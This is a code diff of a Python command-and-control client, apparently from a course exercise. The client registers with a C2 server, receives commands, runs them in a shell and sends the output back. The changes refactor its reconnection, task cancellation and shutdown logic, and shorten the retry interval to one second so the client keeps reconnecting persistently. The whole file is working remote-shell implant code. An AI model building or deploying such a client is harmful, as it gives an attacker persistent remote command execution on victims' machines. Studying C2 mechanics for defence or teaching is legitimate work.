@@ -9,14 +9,12 @@ References:
 """
 
 import asyncio
-import json
 import logging
 import time
 import uuid
-import os
 import argparse
 import subprocess
-from typing import Dict
+from typing import List
 from message import Message
 from models.send_receive_msgs import send_message, receive_message
 from models.message_type import MessageType
@@ -42,12 +40,16 @@ class C2Client:
         self.writer = None
         self.running = True
         self.command_queue = asyncio.Queue()
+        self.shutdown_event = asyncio.Event()
     
     async def connect(self) -> bool:
         """
         Connect to C2 server and register
         """
         try:
+            is_connected = False
+            if not self.running:
+                return False
             self.reader, self.writer = await asyncio.open_connection(
                 self.server_host,
                 self.server_port
@@ -61,84 +63,120 @@ class C2Client:
             )
             
             # Receive acknowledgment
-            logger.info("Waiting for acknowledgment...")
-            ack = await receive_message(self.reader)
-            if ack and ack.type is MessageType.ACK:
-                logger.info(f"Registered as {ack.client_id}")
-                return True
+            msg = await receive_message(self.reader)
+            if msg and msg.type is MessageType.ACK:
+                logger.info(f"Registered as {msg.client_id}")
+                is_connected = True
             else:
                 logger.error("Registration failed")
-                return False
         
+        except ConnectionRefusedError:
+            logger.error("Connection refused, server possibly down")
+        except asyncio.CancelledError:
+            logger.info("Connection attempt cancelled")
         except Exception as e:
             logger.error(f"Connection failed: {e}")
-            return False
+        finally:
+            return is_connected
     
     async def reconnect_loop(self):
         """
         Auto-reconnect logic
-        Attempts to reconnect every 5 seconds if disconnected
+        Attempts to reconnect every 1 second if disconnected
         """
-        reconnect_delay = 5
-        max_delay = 60
+        try:
+            reconnect_delay = 1
         
-        while self.running:
-            try:
-                if not self.reader or not self.writer:
-                    logger.info(f"Attempting to reconnect in {reconnect_delay}s...")
-                    await asyncio.sleep(reconnect_delay)
-                    
-                    if await self.connect():
-                        logger.info(f"Connected successfully {self.client_id}")
-                        reconnect_delay = 5
-                        return  # Exit reconnect loop, let start() handle main_loop
-                    else:
-                        reconnect_delay = min(reconnect_delay * 1.5, max_delay)
-                else:
-                    await asyncio.sleep(1)
-            
-            except Exception as e:
-                logger.error(f"Reconnect loop error: {e}")
+            while self.running:
+                if self.reader and self.writer:
+                    logger.info('reader/writer exists - no reconnection needed')
+                    return
+                
+                if await self.connect():
+                    logger.info(f"Connected successfully {self.client_id}")
+                    return
+                
+                logger.info(f"Attempting to reconnect in {reconnect_delay}s...")
                 await asyncio.sleep(reconnect_delay)
+            
+        except asyncio.CancelledError:
+            logger.info("Reconnect loop cancelled")
+        except Exception as e:
+            logger.error(f"Reconnect loop error: {e}")
     
     async def main_loop(self):
         """
         Main client loop
-        STEP 1: Wait for commands
-        STEP 4: Async with heartbeat handling
         """
+        self.shutdown_event.clear()
         tasks = [
             asyncio.create_task(self._command_listener()),
             asyncio.create_task(self._command_processor()),
         ]
+        tasks.append(
+            asyncio.create_task(self._monitor(tasks))
+        )
         
         try:
-            await asyncio.gather(*tasks)
+            await asyncio.gather(*tasks, return_exceptions=True)
         except asyncio.CancelledError:
             logger.info("Client main loop cancelled")
-            pass
         finally:
             logger.info("Client canceling tasks")
+            await self._cancel_tasks(tasks)
+            # Clear connection state
+            await self._reset_writer_reader()
+
+    async def _reset_writer_reader(self):
+        if self.writer and not self.writer.is_closing():
+            self.writer.close()
+            await self.writer.wait_closed()
+        self.reader = None
+        self.writer = None
+
+    async def _monitor(self, tasks: List[asyncio.Task]):
+        """
+        Monitor connection health
+        """
+        try:
+            await self.shutdown_event.wait()
+            if not self.running:
+                logger.info("Monitor caught termination event triggered")
+            else:
+                logger.info("Monitor caught reconnection event triggered")
+            
+        except asyncio.CancelledError:
+            logger.info("Monitor cancelled")
+        except Exception as e:
+            logger.error(f"Monitor error: {e}")
+        finally:
+            await self._cancel_tasks(tasks)
+
+    @staticmethod
+    async def _cancel_tasks(tasks: List[asyncio.Task]):
+        try:
             for task in tasks:
-                task.cancel()
-            # Clear connection state to trigger reconnection
-            if self.writer:
-                self.writer.close()
-            self.reader = None
-            self.writer = None
+                if not task.done():
+                    task.cancel()
+        except Exception as e:
+            logger.error(f"Error cancelling tasks: {e}")
     
     async def _command_listener(self):
         """
-        STEP 1 & 4: Listen for incoming commands from server
+        Listen for incoming commands from server
         """
-        while self.running and self.reader and not self.reader.at_eof():
-            try:
+        try:
+            while self.running:
                 logger.info("Listening for command")
                 msg = await receive_message(self.reader)
-                
+
+                # Connection closed
                 if not msg:
-                    # Connection closed
-                    logger.info("Server closed connection")
+                    if not self.running:
+                        logger.info("Client closed connection")
+                    else:
+                        logger.info("Server closed connection")
+                    self.shutdown_event.set()
                     break
                 
                 if msg.type is MessageType.COMMAND:
@@ -148,31 +186,24 @@ class C2Client:
                         "command": msg.command
                     })
                     logger.info(f"Received command: {msg.command}")
-                
                 else:
                     logger.warning(f"Unknown message type: {msg.type}")
-            
-            except Exception as e:
-                logger.error(f"Command listener error: {e}")
-                break
         
-        # Connection lost, trigger reconnect
-        if self.writer:
-            self.writer.close()
-            self.reader = None
-            self.writer = None
+        except asyncio.CancelledError:
+            logger.info('command_listener cancelled')
+        except Exception as e:
+            logger.error(f"Command listener error: {e}")
     
     async def _command_processor(self):
         """
-        STEP 1 & 4: Execute commands from queue
-        STEP 4: Async execution with subprocess.run_in_executor
+        Execute commands from queue
         """
-        loop = asyncio.get_event_loop()
-        
-        while self.running:
-            try:
+        try:
+            loop = asyncio.get_event_loop()
+            while self.running:
                 # Get command with timeout
-                cmd_data = await asyncio.wait_for(self.command_queue.get(), timeout=1.0)
+                # cmd_data = await asyncio.wait_for(self.command_queue.get(), timeout=1.0)
+                cmd_data = await self.command_queue.get()
                 
                 cmd_id = cmd_data.get("cmd_id")
                 command = cmd_data.get("command")
@@ -205,37 +236,29 @@ class C2Client:
                 exec_time_ms = (time.time() - start_time) * 1000
                 
                 # Send result back to server
-                if self.writer and not self.writer.is_closing():
-                    success = await send_message(
-                        self.writer,
-                        Message.as_result(cmd_id, result, exec_time_ms)
-                    )
-                    if success:
-                        logger.info(f"Result sent ({exec_time_ms:.1f}ms)")
-                    else:
-                        logger.debug("Failed to send result - connection lost")
-                        break
+                success = await send_message(
+                    self.writer,
+                    Message.as_result(cmd_id, result, exec_time_ms)
+                )
+                if success:
+                    logger.info(f"Result sent ({exec_time_ms:.1f}ms)")
+                else:
+                    logger.debug("Failed to send result - connection lost")
+                    break
                 
                 # Exit after sending kill result
                 if not self.running:
                     return
-                # if not self.running:
-                #     os._exit(0)  # Force exit
             
-            except asyncio.TimeoutError:
-                continue
-            except Exception as e:
-                logger.error(f"Command processor error: {e}")
+        except asyncio.CancelledError:
+            logger.info('command_processor cancelled')
+        except Exception as e:
+            logger.error(f"Command processor error: {e}")
 
-
-    
     def _execute_bash_command(self, command: str) -> str:
         """
-        STEP 4: Execute bash-style command
+        Execute bash-style command
         Supports pipes, redirects, etc.
-        
-        Reference:
-        https://docs.python.org/3/library/subprocess.html
         """
         try:
             # Use shell=True to support pipes, redirects
@@ -267,7 +290,7 @@ class C2Client:
         
         # Start with reconnect loop - it handles both initial connection and reconnections
         while self.running:
-            await self.connect() or await self.reconnect_loop()
+            await self.reconnect_loop()
             if self.reader and self.writer:
                 await self.main_loop()
 
